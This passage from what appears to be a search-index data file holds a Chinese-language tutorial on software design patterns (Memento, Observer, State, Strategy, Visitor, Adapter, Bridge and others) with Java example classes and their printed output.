public class CalculatorImp implements Calculator { private int firstNumber; private int secondNumber; @Override public PreviousCalculationToCareTaker backupLastCalculation() { // create a memento object used for restoring two numbers return new PreviousCalculationImp(firstNumber, secondNumber); } @Override public void restorePreviousCalculation(PreviousCalculationToCareTaker memento) { this.firstNumber = ((PreviousCalculationToOriginator) memento).getFirstNumber(); this.secondNumber = ((PreviousCalculationToOriginator) memento).getSecondNumber(); } @Override public int getCalculationResult() { // result is adding two numbers return firstNumber + secondNumber; } @Override public void setFirstNumber(int firstNumber) { this.firstNumber = firstNumber; } @Override public void setSecondNumber(int secondNumber) { this.secondNumber = secondNumber; }
}
/** * Memento Interface to Originator * * This interface allows the originator to restore its state */
public interface PreviousCalculationToOriginator { int getFirstNumber(); int getSecondNumber();
}
/** * Memento interface to CalculatorOperator (Caretaker) */
public interface PreviousCalculationToCareTaker { // no operations permitted for the caretaker
}
/** * Memento Object Implementation * <p> * Note that this object implements both interfaces to Originator and CareTaker */
public class PreviousCalculationImp implements PreviousCalculationToCareTaker, PreviousCalculationToOriginator { private int firstNumber; private int secondNumber; public PreviousCalculationImp(int firstNumber, int secondNumber) { this.firstNumber = firstNumber; this.secondNumber = secondNumber; } @Override public int getFirstNumber() { return firstNumber; } @Override public int getSecondNumber() { return secondNumber; }
}
/** * CareTaker object */
public class Client { public static void main(String[] args) { // program starts Calculator calculator = new CalculatorImp(); // assume user enters two numbers calculator.setFirstNumber(10); calculator.setSecondNumber(100); // find result System.out.println(calculator.getCalculationResult()); // Store result of this calculation in case of error PreviousCalculationToCareTaker memento = calculator.backupLastCalculation(); // user enters a number calculator.setFirstNumber(17); // user enters a wrong second number and calculates result calculator.setSecondNumber(-290); // calculate result System.out.println(calculator.getCalculationResult()); // user hits CTRL + Z to undo last operation and see last result calculator.restorePreviousCalculation(memento); // result restored System.out.println(calculator.getCalculationResult()); }
}
110
-273
110`},{header:"JDK",slug:"jdk-10",content:"java.io.Serializable"},{header:"7. \u89C2\u5BDF\u8005\uFF08Observer\uFF09",slug:"_7-\u89C2\u5BDF\u8005-observer",content:""},{header:"Intent",slug:"intent-12",content:`\u5B9A\u4E49\u5BF9\u8C61\u4E4B\u95F4\u7684\u4E00\u5BF9\u591A\u4F9D\u8D56\uFF0C\u5F53\u4E00\u4E2A\u5BF9\u8C61\u72B6\u6001\u6539\u53D8\u65F6\uFF0C\u5B83\u7684\u6240\u6709\u4F9D\u8D56\u90FD\u4F1A\u6536\u5230\u901A\u77E5\u5E76\u4E14\u81EA\u52A8\u66F4\u65B0\u72B6\u6001\u3002
\u4E3B\u9898\uFF08Subject\uFF09\u662F\u88AB\u89C2\u5BDF\u7684\u5BF9\u8C61\uFF0C\u800C\u5176\u6240\u6709\u4F9D\u8D56\u8005\uFF08Observer\uFF09\u79F0\u4E3A\u89C2\u5BDF\u8005\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/7a3c6a30-c735-4edb-8115-337288a4f0f2.jpg" width="600)`},{header:"Class Diagram",slug:"class-diagram-12",content:`\u4E3B\u9898\uFF08Subject\uFF09\u5177\u6709\u6CE8\u518C\u548C\u79FB\u9664\u89C2\u5BDF\u8005\u3001\u5E76\u901A\u77E5\u6240\u6709\u89C2\u5BDF\u8005\u7684\u529F\u80FD\uFF0C\u4E3B\u9898\u662F\u901A\u8FC7\u7EF4\u62A4\u4E00\u5F20\u89C2\u5BDF\u8005\u5217\u8868\u6765\u5B9E\u73B0\u8FD9\u4E9B\u64CD\u4F5C\u7684\u3002
\u89C2\u5BDF\u8005\uFF08Observer\uFF09\u7684\u6CE8\u518C\u529F\u80FD\u9700\u8981\u8C03\u7528\u4E3B\u9898\u7684 registerObserver() \u65B9\u6CD5\u3002`},{header:"Implementation",slug:"implementation-12",content:`\u5929\u6C14\u6570\u636E\u5E03\u544A\u677F\u4F1A\u5728\u5929\u6C14\u4FE1\u606F\u53D1\u751F\u6539\u53D8\u65F6\u66F4\u65B0\u5176\u5185\u5BB9\uFF0C\u5E03\u544A\u677F\u6709\u591A\u4E2A\uFF0C\u5E76\u4E14\u5728\u5C06\u6765\u4F1A\u7EE7\u7EED\u589E\u52A0\u3002 public interface Subject { void registerObserver(Observer o); void removeObserver(Observer o); void notifyObserver();
}
public class WeatherData implements Subject { private List<Observer> observers; private float temperature; private float humidity; private float pressure; public WeatherData() { observers = new ArrayList<>(); } public void setMeasurements(float temperature, float humidity, float pressure) { this.temperature = temperature; this.humidity = humidity; this.pressure = pressure; notifyObserver(); } @Override public void registerObserver(Observer o) { observers.add(o); } @Override public void removeObserver(Observer o) { int i = observers.indexOf(o); if (i >= 0) { observers.remove(i); } } @Override public void notifyObserver() { for (Observer o : observers) { o.update(temperature, humidity, pressure); } }
}
public interface Observer { void update(float temp, float humidity, float pressure);
}
public class StatisticsDisplay implements Observer { public StatisticsDisplay(Subject weatherData) { weatherData.reisterObserver(this); } @Override public void update(float temp, float humidity, float pressure) { System.out.println("StatisticsDisplay.update: " + temp + " " + humidity + " " + pressure); }
}
public class CurrentConditionsDisplay implements Observer { public CurrentConditionsDisplay(Subject weatherData) { weatherData.registerObserver(this); } @Override public void update(float temp, float humidity, float pressure) { System.out.println("CurrentConditionsDisplay.update: " + temp + " " + humidity + " " + pressure); }
}
public class WeatherStation { public static void main(String[] args) { WeatherData weatherData = new WeatherData(); CurrentConditionsDisplay currentConditionsDisplay = new CurrentConditionsDisplay(weatherData); StatisticsDisplay statisticsDisplay = new StatisticsDisplay(weatherData); weatherData.setMeasurements(0, 0, 0); weatherData.setMeasurements(1, 1, 1); }
}
CurrentConditionsDisplay.update: 0.0 0.0 0.0
StatisticsDisplay.update: 0.0 0.0 0.0
CurrentConditionsDisplay.update: 1.0 1.0 1.0
StatisticsDisplay.update: 1.0 1.0 1.0`},{header:"JDK",slug:"jdk-11",content:`java.util.Observer
java.util.EventListener
javax.servlet.http.HttpSessionBindingListener
RxJava`},{header:"8. \u72B6\u6001\uFF08State\uFF09",slug:"_8-\u72B6\u6001-state",content:""},{header:"Intent",slug:"intent-13",content:"\u5141\u8BB8\u5BF9\u8C61\u5728\u5185\u90E8\u72B6\u6001\u6539\u53D8\u65F6\u6539\u53D8\u5B83\u7684\u884C\u4E3A\uFF0C\u5BF9\u8C61\u770B\u8D77\u6765\u597D\u50CF\u4FEE\u6539\u4E86\u5B83\u6240\u5C5E\u7684\u7C7B\u3002"},{header:"Class Diagram",slug:"class-diagram-13",content:""},{header:"Implementation",slug:"implementation-13",content:`\u7CD6\u679C\u9500\u552E\u673A\u6709\u591A\u79CD\u72B6\u6001\uFF0C\u6BCF\u79CD\u72B6\u6001\u4E0B\u9500\u552E\u673A\u6709\u4E0D\u540C\u7684\u884C\u4E3A\uFF0C\u72B6\u6001\u53EF\u4EE5\u53D1\u751F\u8F6C\u79FB\uFF0C\u4F7F\u5F97\u9500\u552E\u673A\u7684\u884C\u4E3A\u4E5F\u53D1\u751F\u6539\u53D8\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/396be981-3f2c-4fd9-8101-dbf9c841504b.jpg" width="600)
public interface State { /** * \u6295\u5165 25 \u5206\u94B1 */ void insertQuarter(); /** * \u9000\u56DE 25 \u5206\u94B1 */ void ejectQuarter(); /** * \u8F6C\u52A8\u66F2\u67C4 */ void turnCrank(); /** * \u53D1\u653E\u7CD6\u679C */ void dispense();
}
public class HasQuarterState implements State { private GumballMachine gumballMachine; public HasQuarterState(GumballMachine gumballMachine) { this.gumballMachine = gumballMachine; } @Override public void insertQuarter() { System.out.println("You can't insert another quarter"); } @Override public void ejectQuarter() { System.out.println("Quarter returned"); gumballMachine.setState(gumballMachine.getNoQuarterState()); } @Override public void turnCrank() { System.out.println("You turned..."); gumballMachine.setState(gumballMachine.getSoldState()); } @Override public void dispense() { System.out.println("No gumball dispensed"); }
}
public class NoQuarterState implements State { GumballMachine gumballMachine; public NoQuarterState(GumballMachine gumballMachine) { this.gumballMachine = gumballMachine; } @Override public void insertQuarter() { System.out.println("You insert a quarter"); gumballMachine.setState(gumballMachine.getHasQuarterState()); } @Override public void ejectQuarter() { System.out.println("You haven't insert a quarter"); } @Override public void turnCrank() { System.out.println("You turned, but there's no quarter"); } @Override public void dispense() { System.out.println("You need to pay first"); }
}
public class SoldOutState implements State { GumballMachine gumballMachine; public SoldOutState(GumballMachine gumballMachine) { this.gumballMachine = gumballMachine; } @Override public void insertQuarter() { System.out.println("You can't insert a quarter, the machine is sold out"); } @Override public void ejectQuarter() { System.out.println("You can't eject, you haven't inserted a quarter yet"); } @Override public void turnCrank() { System.out.println("You turned, but there are no gumballs"); } @Override public void dispense() { System.out.println("No gumball dispensed"); }
}
public class SoldState implements State { GumballMachine gumballMachine; public SoldState(GumballMachine gumballMachine) { this.gumballMachine = gumballMachine; } @Override public void insertQuarter() { System.out.println("Please wait, we're already giving you a gumball"); } @Override public void ejectQuarter() { System.out.println("Sorry, you already turned the crank"); } @Override public void turnCrank() { System.out.println("Turning twice doesn't get you another gumball!"); } @Override public void dispense() { gumballMachine.releaseBall(); if (gumballMachine.getCount() > 0) { gumballMachine.setState(gumballMachine.getNoQuarterState()); } else { System.out.println("Oops, out of gumballs"); gumballMachine.setState(gumballMachine.getSoldOutState()); } }
}
public class GumballMachine { private State soldOutState; private State noQuarterState; private State hasQuarterState; private State soldState; private State state; private int count = 0; public GumballMachine(int numberGumballs) { count = numberGumballs; soldOutState = new SoldOutState(this); noQuarterState = new NoQuarterState(this); hasQuarterState = new HasQuarterState(this); soldState = new SoldState(this); if (numberGumballs > 0) { state = noQuarterState; } else { state = soldOutState; } } public void insertQuarter() { state.insertQuarter(); } public void ejectQuarter() { state.ejectQuarter(); } public void turnCrank() { state.turnCrank(); state.dispense(); } public void setState(State state) { this.state = state; } public void releaseBall() { System.out.println("A gumball comes rolling out the slot..."); if (count != 0) { count -= 1; } } public State getSoldOutState() { return soldOutState; } public State getNoQuarterState() { return noQuarterState; } public State getHasQuarterState() { return hasQuarterState; } public State getSoldState() { return soldState; } public int getCount() { return count; }
}
public class Client { public static void main(String[] args) { GumballMachine gumballMachine = new GumballMachine(5); gumballMachine.insertQuarter(); gumballMachine.turnCrank(); gumballMachine.insertQuarter(); gumballMachine.ejectQuarter(); gumballMachine.turnCrank(); gumballMachine.insertQuarter(); gumballMachine.turnCrank(); gumballMachine.insertQuarter(); gumballMachine.turnCrank(); gumballMachine.ejectQuarter(); gumballMachine.insertQuarter(); gumballMachine.insertQuarter(); gumballMachine.turnCrank(); gumballMachine.insertQuarter(); gumballMachine.turnCrank(); gumballMachine.insertQuarter(); gumballMachine.turnCrank(); }
}
You insert a quarter
You turned...
A gumball comes rolling out the slot...
You insert a quarter
Quarter returned
You turned, but there's no quarter
You need to pay first
You insert a quarter
You turned...
A gumball comes rolling out the slot...
You insert a quarter
You turned...
A gumball comes rolling out the slot...
You haven't insert a quarter
You insert a quarter
You can't insert another quarter
You turned...
A gumball comes rolling out the slot...
You insert a quarter
You turned...
A gumball comes rolling out the slot...
Oops, out of gumballs
You can't insert a quarter, the machine is sold out
You turned, but there are no gumballs
No gumball dispensed`},{header:"9. \u7B56\u7565\uFF08Strategy\uFF09",slug:"_9-\u7B56\u7565-strategy",content:""},{header:"Intent",slug:"intent-14",content:`\u5B9A\u4E49\u4E00\u7CFB\u5217\u7B97\u6CD5\uFF0C\u5C01\u88C5\u6BCF\u4E2A\u7B97\u6CD5\uFF0C\u5E76\u4F7F\u5B83\u4EEC\u53EF\u4EE5\u4E92\u6362\u3002
\u7B56\u7565\u6A21\u5F0F\u53EF\u4EE5\u8BA9\u7B97\u6CD5\u72EC\u7ACB\u4E8E\u4F7F\u7528\u5B83\u7684\u5BA2\u6237\u7AEF\u3002`},{header:"Class Diagram",slug:"class-diagram-14",content:`Strategy \u63A5\u53E3\u5B9A\u4E49\u4E86\u4E00\u4E2A\u7B97\u6CD5\u65CF\uFF0C\u5B83\u4EEC\u90FD\u5B9E\u73B0\u4E86 behavior() \u65B9\u6CD5\u3002
Context \u662F\u4F7F\u7528\u5230\u8BE5\u7B97\u6CD5\u65CF\u7684\u7C7B\uFF0C\u5176\u4E2D\u7684 doSomething() \u65B9\u6CD5\u4F1A\u8C03\u7528 behavior()\uFF0CsetStrategy(Strategy) \u65B9\u6CD5\u53EF\u4EE5\u52A8\u6001\u5730\u6539\u53D8 strategy \u5BF9\u8C61\uFF0C\u4E5F\u5C31\u662F\u8BF4\u80FD\u52A8\u6001\u5730\u6539\u53D8 Context \u6240\u4F7F\u7528\u7684\u7B97\u6CD5\u3002`},{header:"\u4E0E\u72B6\u6001\u6A21\u5F0F\u7684\u6BD4\u8F83",slug:"\u4E0E\u72B6\u6001\u6A21\u5F0F\u7684\u6BD4\u8F83",content:`\u72B6\u6001\u6A21\u5F0F\u7684\u7C7B\u56FE\u548C\u7B56\u7565\u6A21\u5F0F\u7C7B\u4F3C\uFF0C\u5E76\u4E14\u90FD\u662F\u80FD\u591F\u52A8\u6001\u6539\u53D8\u5BF9\u8C61\u7684\u884C\u4E3A\u3002\u4F46\u662F\u72B6\u6001\u6A21\u5F0F\u662F\u901A\u8FC7\u72B6\u6001\u8F6C\u79FB\u6765\u6539\u53D8 Context \u6240\u7EC4\u5408\u7684 State \u5BF9\u8C61\uFF0C\u800C\u7B56\u7565\u6A21\u5F0F\u662F\u901A\u8FC7 Context \u672C\u8EAB\u7684\u51B3\u7B56\u6765\u6539\u53D8\u7EC4\u5408\u7684 Strategy \u5BF9\u8C61\u3002\u6240\u8C13\u7684\u72B6\u6001\u8F6C\u79FB\uFF0C\u662F\u6307 Context \u5728\u8FD0\u884C\u8FC7\u7A0B\u4E2D\u7531\u4E8E\u4E00\u4E9B\u6761\u4EF6\u53D1\u751F\u6539\u53D8\u800C\u4F7F\u5F97 State \u5BF9\u8C61\u53D1\u751F\u6539\u53D8\uFF0C\u6CE8\u610F\u5FC5\u987B\u8981\u662F\u5728\u8FD0\u884C\u8FC7\u7A0B\u4E2D\u3002
\u72B6\u6001\u6A21\u5F0F\u4E3B\u8981\u662F\u7528\u6765\u89E3\u51B3\u72B6\u6001\u8F6C\u79FB\u7684\u95EE\u9898\uFF0C\u5F53\u72B6\u6001\u53D1\u751F\u8F6C\u79FB\u4E86\uFF0C\u90A3\u4E48 Context \u5BF9\u8C61\u5C31\u4F1A\u6539\u53D8\u5B83\u7684\u884C\u4E3A\uFF1B\u800C\u7B56\u7565\u6A21\u5F0F\u4E3B\u8981\u662F\u7528\u6765\u5C01\u88C5\u4E00\u7EC4\u53EF\u4EE5\u4E92\u76F8\u66FF\u4EE3\u7684\u7B97\u6CD5\u65CF\uFF0C\u5E76\u4E14\u53EF\u4EE5\u6839\u636E\u9700\u8981\u52A8\u6001\u5730\u53BB\u66FF\u6362 Context \u4F7F\u7528\u7684\u7B97\u6CD5\u3002`},{header:"Implementation",slug:"implementation-14",content:`\u8BBE\u8BA1\u4E00\u4E2A\u9E2D\u5B50\uFF0C\u5B83\u53EF\u4EE5\u52A8\u6001\u5730\u6539\u53D8\u53EB\u58F0\u3002\u8FD9\u91CC\u7684\u7B97\u6CD5\u65CF\u662F\u9E2D\u5B50\u7684\u53EB\u58F0\u884C\u4E3A\u3002
public interface QuackBehavior { void quack();
}
public class Quack implements QuackBehavior { @Override public void quack() { System.out.println("quack!"); }
}
public class Squeak implements QuackBehavior{ @Override public void quack() { System.out.println("squeak!"); }
}
public class Duck { private QuackBehavior quackBehavior; public void performQuack() { if (quackBehavior != null) { quackBehavior.quack(); } } public void setQuackBehavior(QuackBehavior quackBehavior) { this.quackBehavior = quackBehavior; }
}
public class Client { public static void main(String[] args) { Duck duck = new Duck(); duck.setQuackBehavior(new Squeak()); duck.performQuack(); duck.setQuackBehavior(new Quack()); duck.performQuack(); }
}
squeak!
quack!`},{header:"JDK",slug:"jdk-12",content:`java.util.Comparator#compare()
javax.servlet.http.HttpServlet
javax.servlet.Filter#doFilter()`},{header:"10. \u6A21\u677F\u65B9\u6CD5\uFF08Template Method\uFF09",slug:"_10-\u6A21\u677F\u65B9\u6CD5-template-method",content:""},{header:"Intent",slug:"intent-15",content:`\u5B9A\u4E49\u7B97\u6CD5\u6846\u67B6\uFF0C\u5E76\u5C06\u4E00\u4E9B\u6B65\u9AA4\u7684\u5B9E\u73B0\u5EF6\u8FDF\u5230\u5B50\u7C7B\u3002
\u901A\u8FC7\u6A21\u677F\u65B9\u6CD5\uFF0C\u5B50\u7C7B\u53EF\u4EE5\u91CD\u65B0\u5B9A\u4E49\u7B97\u6CD5\u7684\u67D0\u4E9B\u6B65\u9AA4\uFF0C\u800C\u4E0D\u7528\u6539\u53D8\u7B97\u6CD5\u7684\u7ED3\u6784\u3002`},{header:"Class Diagram",slug:"class-diagram-15",content:""},{header:"Implementation",slug:"implementation-15",content:`\u51B2\u5496\u5561\u548C\u51B2\u8336\u90FD\u6709\u7C7B\u4F3C\u7684\u6D41\u7A0B\uFF0C\u4F46\u662F\u67D0\u4E9B\u6B65\u9AA4\u4F1A\u6709\u70B9\u4E0D\u4E00\u6837\uFF0C\u8981\u6C42\u590D\u7528\u90A3\u4E9B\u76F8\u540C\u6B65\u9AA4\u7684\u4EE3\u7801\u3002 public abstract class CaffeineBeverage { final void prepareRecipe() { boilWater(); brew(); pourInCup(); addCondiments(); } abstract void brew(); abstract void addCondiments(); void boilWater() { System.out.println("boilWater"); } void pourInCup() { System.out.println("pourInCup"); }
}
public class Coffee extends CaffeineBeverage { @Override void brew() { System.out.println("Coffee.brew"); } @Override void addCondiments() { System.out.println("Coffee.addCondiments"); }
}
public class Tea extends CaffeineBeverage { @Override void brew() { System.out.println("Tea.brew"); } @Override void addCondiments() { System.out.println("Tea.addCondiments"); }
}
public class Client { public static void main(String[] args) { CaffeineBeverage caffeineBeverage = new Coffee(); caffeineBeverage.prepareRecipe(); System.out.println("-----------"); caffeineBeverage = new Tea(); caffeineBeverage.prepareRecipe(); }
}
boilWater
Coffee.brew
pourInCup
Coffee.addCondiments
-----------
boilWater
Tea.brew
pourInCup
Tea.addCondiments`},{header:"JDK",slug:"jdk-13",content:`java.util.Collections#sort()
java.io.InputStream#skip()
java.io.InputStream#read()
java.util.AbstractList#indexOf()`},{header:"11. \u8BBF\u95EE\u8005\uFF08Visitor\uFF09",slug:"_11-\u8BBF\u95EE\u8005-visitor",content:""},{header:"Intent",slug:"intent-16",content:"\u4E3A\u4E00\u4E2A\u5BF9\u8C61\u7ED3\u6784\uFF08\u6BD4\u5982\u7EC4\u5408\u7ED3\u6784\uFF09\u589E\u52A0\u65B0\u80FD\u529B\u3002"},{header:"Class Diagram",slug:"class-diagram-16",content:`Visitor\uFF1A\u8BBF\u95EE\u8005\uFF0C\u4E3A\u6BCF\u4E00\u4E2A ConcreteElement \u58F0\u660E\u4E00\u4E2A visit \u64CD\u4F5C
ConcreteVisitor\uFF1A\u5177\u4F53\u8BBF\u95EE\u8005\uFF0C\u5B58\u50A8\u904D\u5386\u8FC7\u7A0B\u4E2D\u7684\u7D2F\u8BA1\u7ED3\u679C
ObjectStructure\uFF1A\u5BF9\u8C61\u7ED3\u6784\uFF0C\u53EF\u4EE5\u662F\u7EC4\u5408\u7ED3\u6784\uFF0C\u6216\u8005\u662F\u4E00\u4E2A\u96C6\u5408\u3002`},{header:"Implementation",slug:"implementation-16",content:`public interface Element { void accept(Visitor visitor);
}
class CustomerGroup { private List<Customer> customers = new ArrayList<>(); void accept(Visitor visitor) { for (Customer customer : customers) { customer.accept(visitor); } } void addCustomer(Customer customer) { customers.add(customer); }
}
public class Customer implements Element { private String name; private List<Order> orders = new ArrayList<>(); Customer(String name) { this.name = name; } String getName() { return name; } void addOrder(Order order) { orders.add(order); } public void accept(Visitor visitor) { visitor.visit(this); for (Order order : orders) { order.accept(visitor); } }
}
public class Order implements Element { private String name; private List<Item> items = new ArrayList(); Order(String name) { this.name = name; } Order(String name, String itemName) { this.name = name; this.addItem(new Item(itemName)); } String getName() { return name; } void addItem(Item item) { items.add(item); } public void accept(Visitor visitor) { visitor.visit(this); for (Item item : items) { item.accept(visitor); } }
}
public class Item implements Element { private String name; Item(String name) { this.name = name; } String getName() { return name; } public void accept(Visitor visitor) { visitor.visit(this); }
}
public interface Visitor { void visit(Customer customer); void visit(Order order); void visit(Item item);
}
public class GeneralReport implements Visitor { private int customersNo; private int ordersNo; private int itemsNo; public void visit(Customer customer) { System.out.println(customer.getName()); customersNo++; } public void visit(Order order) { System.out.println(order.getName()); ordersNo++; } public void visit(Item item) { System.out.println(item.getName()); itemsNo++; } public void displayResults() { System.out.println("Number of customers: " + customersNo); System.out.println("Number of orders: " + ordersNo); System.out.println("Number of items: " + itemsNo); }
}
public class Client { public static void main(String[] args) { Customer customer1 = new Customer("customer1"); customer1.addOrder(new Order("order1", "item1")); customer1.addOrder(new Order("order2", "item1")); customer1.addOrder(new Order("order3", "item1")); Order order = new Order("order_a"); order.addItem(new Item("item_a1")); order.addItem(new Item("item_a2")); order.addItem(new Item("item_a3")); Customer customer2 = new Customer("customer2"); customer2.addOrder(order); CustomerGroup customers = new CustomerGroup(); customers.addCustomer(customer1); customers.addCustomer(customer2); GeneralReport visitor = new GeneralReport(); customers.accept(visitor); visitor.displayResults(); }
}
customer1
order1
item1
order2
item1
order3
item1
customer2
order_a
item_a1
item_a2
item_a3
Number of customers: 2
Number of orders: 4
Number of items: 6`},{header:"JDK",slug:"jdk-14",content:`javax.lang.model.element.Element and javax.lang.model.element.ElementVisitor
javax.lang.model.type.TypeMirror and javax.lang.model.type.TypeVisitor`},{header:"12. \u7A7A\u5BF9\u8C61\uFF08Null\uFF09",slug:"_12-\u7A7A\u5BF9\u8C61-null",content:""},{header:"Intent",slug:"intent-17",content:`\u4F7F\u7528\u4EC0\u4E48\u90FD\u4E0D\u505A\u7684\u7A7A\u5BF9\u8C61\u6765\u4EE3\u66FF NULL\u3002
\u4E00\u4E2A\u65B9\u6CD5\u8FD4\u56DE NULL\uFF0C\u610F\u5473\u7740\u65B9\u6CD5\u7684\u8C03\u7528\u7AEF\u9700\u8981\u53BB\u68C0\u67E5\u8FD4\u56DE\u503C\u662F\u5426\u662F NULL\uFF0C\u8FD9\u4E48\u505A\u4F1A\u5BFC\u81F4\u975E\u5E38\u591A\u7684\u5197\u4F59\u7684\u68C0\u67E5\u4EE3\u7801\u3002\u5E76\u4E14\u5982\u679C\u67D0\u4E00\u4E2A\u8C03\u7528\u7AEF\u5FD8\u8BB0\u4E86\u505A\u8FD9\u4E2A\u68C0\u67E5\u8FD4\u56DE\u503C\uFF0C\u800C\u76F4\u63A5\u4F7F\u7528\u8FD4\u56DE\u7684\u5BF9\u8C61\uFF0C\u90A3\u4E48\u5C31\u6709\u53EF\u80FD\u629B\u51FA\u7A7A\u6307\u9488\u5F02\u5E38\u3002`},{header:"Class Diagram",slug:"class-diagram-17",content:""},{header:"Implementation",slug:"implementation-17",content:`public abstract class AbstractOperation { abstract void request();
}
public class RealOperation extends AbstractOperation { @Override void request() { System.out.println("do something"); }
}
public class NullOperation extends AbstractOperation{ @Override void request() { // do nothing }
}
public class Client { public static void main(String[] args) { AbstractOperation abstractOperation = func(-1); abstractOperation.request(); } public static AbstractOperation func(int para) { if (para < 0) { return new NullOperation(); } return new RealOperation(); }
}`},{header:"\u56DB\u3001\u7ED3\u6784\u578B",slug:"\u56DB\u3001\u7ED3\u6784\u578B",content:""},{header:"1. \u9002\u914D\u5668\uFF08Adapter\uFF09",slug:"_1-\u9002\u914D\u5668-adapter",content:""},{header:"Intent",slug:"intent-18",content:"\u628A\u4E00\u4E2A\u7C7B\u63A5\u53E3\u8F6C\u6362\u6210\u53E6\u4E00\u4E2A\u7528\u6237\u9700\u8981\u7684\u63A5\u53E3\u3002"},{header:"Class Diagram",slug:"class-diagram-18",content:""},{header:"Implementation",slug:"implementation-18",content:`\u9E2D\u5B50\uFF08Duck\uFF09\u548C\u706B\u9E21\uFF08Turkey\uFF09\u62E5\u6709\u4E0D\u540C\u7684\u53EB\u58F0\uFF0CDuck \u7684\u53EB\u58F0\u8C03\u7528 quack() \u65B9\u6CD5\uFF0C\u800C Turkey \u8C03\u7528 gobble() \u65B9\u6CD5\u3002
\u8981\u6C42\u5C06 Turkey \u7684 gobble() \u65B9\u6CD5\u9002\u914D\u6210 Duck \u7684 quack() \u65B9\u6CD5\uFF0C\u4ECE\u800C\u8BA9\u706B\u9E21\u5192\u5145\u9E2D\u5B50\uFF01
public interface Duck { void quack();
}
public interface Turkey { void gobble();
}
public class WildTurkey implements Turkey { @Override public void gobble() { System.out.println("gobble!"); }
}
public class TurkeyAdapter implements Duck { Turkey turkey; public TurkeyAdapter(Turkey turkey) { this.turkey = turkey; } @Override public void quack() { turkey.gobble(); }
}
public class Client { public static void main(String[] args) { Turkey turkey = new WildTurkey(); Duck duck = new TurkeyAdapter(turkey); duck.quack(); }
}`},{header:"JDK",slug:"jdk-15",content:`java.util.Arrays#asList()
java.util.Collections#list()
java.util.Collections#enumeration()
javax.xml.bind.annotation.adapters.XMLAdapter`},{header:"2. \u6865\u63A5\uFF08Bridge\uFF09",slug:"_2-\u6865\u63A5-bridge",content:""},{header:"Intent",slug:"intent-19",content:"\u5C06\u62BD\u8C61\u4E0E\u5B9E\u73B0\u5206\u79BB\u5F00\u6765\uFF0C\u4F7F\u5B83\u4EEC\u53EF\u4EE5\u72EC\u7ACB\u53D8\u5316\u3002"},{header:"Class Diagram",slug:"class-diagram-19",content:`Abstraction\uFF1A\u5B9A\u4E49\u62BD\u8C61\u7C7B\u7684\u63A5\u53E3
Implementor\uFF1A\u5B9A\u4E49\u5B9E\u73B0\u7C7B\u63A5\u53E3`},{header:"Implementation",slug:"implementation-19",content:`RemoteControl \u8868\u793A\u9065\u63A7\u5668\uFF0C\u6307\u4EE3 Abstraction\u3002
TV \u8868\u793A\u7535\u89C6\uFF0C\u6307\u4EE3 Implementor\u3002
\u6865\u63A5\u6A21\u5F0F\u5C06\u9065\u63A7\u5668\u548C\u7535\u89C6\u5206\u79BB\u5F00\u6765\uFF0C\u4ECE\u800C\u53EF\u4EE5\u72EC\u7ACB\u6539\u53D8\u9065\u63A7\u5668\u6216\u8005\u7535\u89C6\u7684\u5B9E\u73B0\u3002
public abstract class TV { public abstract void on(); public abstract void off(); public abstract void tuneChannel();
}
public class Sony extends TV { @Override public void on() { System.out.println("Sony.on()"); } @Override public void off() { System.out.println("Sony.off()"); } @Override public void tuneChannel() { System.out.println("Sony.tuneChannel()"); }
}
public class RCA extends TV { @Override public void on() { System.out.println("RCA.on()"); } @Override public void off() { System.out.println("RCA.off()"); } @Override public void tuneChannel() { System.out.println("RCA.tuneChannel()"); }
}
public abstract class RemoteControl { protected TV tv; public RemoteControl(TV tv) { this.tv = tv; } public abstract void on(); public abstract void off(); public abstract void tuneChannel();
}
public class ConcreteRemoteControl1 extends RemoteControl { public ConcreteRemoteControl1(TV tv) { super(tv); } @Override public void on() { System.out.println("ConcreteRemoteControl1.on()"); tv.on(); } @Override public void off() { System.out.println("ConcreteRemoteControl1.off()"); tv.off(); } @Override public void tuneChannel() { System.out.println("ConcreteRemoteControl1.tuneChannel()"); tv.tuneChannel(); }
}
public class ConcreteRemoteControl2 extends RemoteControl { public ConcreteRemoteControl2(TV tv) { super(tv); } @Override public void on() { System.out.println("ConcreteRemoteControl2.on()"); tv.on(); } @Override public void off() { System.out.println("ConcreteRemoteControl2.off()"); tv.off(); } @Override public void tuneChannel() { System.out.println("ConcreteRemoteControl2.tuneChannel()"); tv.tuneChannel(); }
}
public class Client { public static void main(String[] args) { RemoteControl remoteControl1 = new ConcreteRemoteControl1(new RCA()); remoteControl1.on(); remoteControl1.off(); remoteControl1.tuneChannel(); RemoteControl remoteControl2 = new ConcreteRemoteControl2(new Sony()); remoteControl2.on(); remoteControl2.off(); remoteControl2.tuneChannel(); }
}`},{header:"JDK",slug:"jdk-16",content:`AWT (It provides an abstraction layer which maps onto the native OS the windowing support.)
JDBC`},{header:"3. \u7EC4\u5408\uFF08Composite\uFF09",slug:"_3-\u7EC4\u5408-composite",content:""},{header:"Intent",slug:"intent-20",content:"\u5C06\u5BF9\u8C61\u7EC4\u5408\u6210\u6811\u5F62\u7ED3\u6784\u6765\u8868\u793A\u201C\u6574\u4F53/\u90E8\u5206\u201D\u5C42\u6B21\u5173\u7CFB\uFF0C\u5141\u8BB8\u7528\u6237\u4EE5\u76F8\u540C\u7684\u65B9\u5F0F\u5904\u7406\u5355\u72EC\u5BF9\u8C61\u548C\u7EC4\u5408\u5BF9\u8C61\u3002"},{header:"Class Diagram",slug:"class-diagram-20",content:`\u7EC4\u4EF6\uFF08Component\uFF09\u7C7B\u662F\u7EC4\u5408\u7C7B\uFF08Composite\uFF09\u548C\u53F6\u5B50\u7C7B\uFF08Leaf\uFF09\u7684\u7236\u7C7B\uFF0C\u53EF\u4EE5\u628A\u7EC4\u5408\u7C7B\u770B\u6210\u662F\u6811\u7684\u4E2D\u95F4\u8282\u70B9\u3002
